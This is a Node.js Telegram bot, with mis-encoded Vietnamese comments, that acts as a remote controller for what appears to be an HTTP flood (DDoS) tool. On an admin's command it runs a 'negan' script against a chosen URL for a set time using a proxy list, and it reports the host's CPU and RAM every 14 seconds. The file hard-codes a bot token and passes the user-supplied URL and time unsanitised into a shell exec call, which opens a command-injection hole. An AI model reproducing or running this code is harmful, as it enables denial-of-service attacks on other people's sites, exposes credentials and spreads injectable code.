const TelegramBot = require('node-telegram-bot-api');
const { exec } = require('child_process');
const os = require('os');

const token = '8129263243:AAGIqN8ykh5sc00MC5N_Lam5Xj72v3VTjU0';
const bot = new TelegramBot(token, { polling: true });

const adminId = 7371969470;

// H√†m l·∫•y th√¥ng s·ªë CPU v√† RAM
function getSystemStats() {
    const totalMemory = os.totalmem(); // T·ªïng RAM (bytes)
    const freeMemory = os.freemem(); // RAM c√≤n tr·ªëng (bytes)
    const usedMemory = totalMemory - freeMemory; // RAM ƒë√£ s·ª≠ d·ª•ng (bytes)
    const memoryUsagePercent = ((usedMemory / totalMemory) * 100).toFixed(2); // % RAM ƒë√£ s·ª≠ d·ª•ng

    const cpus = os.cpus(); // Th√¥ng tin CPU cores
    const cpuUsagePercent = (
        cpus.reduce((acc, cpu) => {
            const total = Object.values(cpu.times).reduce((a, b) => a + b, 0);
            const idle = cpu.times.idle;
            return acc + (100 - (idle / total) * 100);
        }, 0) / cpus.length
    ).toFixed(2); // % CPU ƒë√£ s·ª≠ d·ª•ng

    return {
        memoryUsagePercent,
        cpuUsagePercent,
        totalMemory: (totalMemory / 1024 / 1024 / 1024).toFixed(0), // Chuy·ªÉn ƒë·ªïi sang GB (l√†m tr√≤n)
        freeMemory: (freeMemory / 1024 / 1024 / 1024).toFixed(0), // Chuy·ªÉn ƒë·ªïi sang GB (l√†m tr√≤n)
    };
}

// G·ª≠i th√¥ng s·ªë CPU v√† RAM m·ªói 14 gi√¢y
setInterval(() => {
    const stats = getSystemStats();
    const cpuFreePercent = (100 - parseFloat(stats.cpuUsagePercent)).toFixed(2); // % CPU c√≤n tr·ªëng

    const message = `
Th√¥ng s·ªë ƒë√£ s·ª≠ d·ª•ng: üöÄ 
- CPU ƒë√£ s·ª≠ d·ª•ng: ${stats.cpuUsagePercent}%
- RAM ƒë√£ s·ª≠ d·ª•ng: ${stats.memoryUsagePercent}%

Th√¥ng s·ªë c√≤n tr·ªëng: ‚ù§Ô∏è
- CPU c√≤n tr·ªëng: ${cpuFreePercent}%
- RAM c√≤n tr·ªëng: ${stats.freeMemory}GB
- T·ªïng RAM: ${stats.totalMemory}GB
    `;
    bot.sendMessage(adminId, message);
}, 14000); // 14 gi√¢y

// X·ª≠ l√Ω l·ªánh t·ª´ admin
bot.on('message', (msg) => {
    const chatId = msg.chat.id;
    const text = msg.text;

    if (chatId !== adminId) {
        bot.sendMessage(chatId, 'B·∫°n kh√¥ng c√≥ quy·ªÅn th·ª±c hi·ªán l·ªánh n√†y.');
        return;
    }

    const parts = text.split(' ');
    if (parts.length !== 2 || !parts[0].startsWith('http')) {
        bot.sendMessage(chatId, 'Sai ƒë·ªãnh d·∫°ng! Nh·∫≠p theo: <URL> <time>.');
        return;
    }

    const [host, time] = parts;

    if (!host.startsWith('http://') && !host.startsWith('https://')) {
        bot.sendMessage(chatId, 'URL kh√¥ng h·ª£p l·ªá! C·∫ßn c√≥ http:// ho·∫∑c https://.');
        return;
    }

    const command = `node ./negan -m GET -u ${host} -p live.txt --full true -s ${time}`;

    // Debug: In ra l·ªánh s·∫Ω ƒë∆∞·ª£c th·ª±c thi trong build logs
    console.log(`[DEBUG] L·ªánh ƒë∆∞·ª£c th·ª±c thi: ${command}`);

    // Th·ª±c thi l·ªánh v√† debug k·∫øt qu·∫£
    exec(command, (error, stdout, stderr) => {
        if (error) {
            console.error(`[DEBUG] L·ªói khi th·ª±c thi l·ªánh: ${error.message}`);
            return;
        }

        if (stderr) {
            console.error(`[DEBUG] L·ªói t·ª´ stderr: ${stderr}`);
            return;
        }

        // Debug: In ra k·∫øt qu·∫£ t·ª´ stdout
        console.log(`[DEBUG] K·∫øt qu·∫£ t·ª´ stdout: ${stdout}`);
    });

    // G·ª≠i th√¥ng b√°o th√†nh c√¥ng ngay l·∫≠p t·ª©c
    bot.sendMessage(chatId, `L·ªánh ƒë√£ ƒë∆∞·ª£c g·ª≠i Successfully: ${command}`);
});
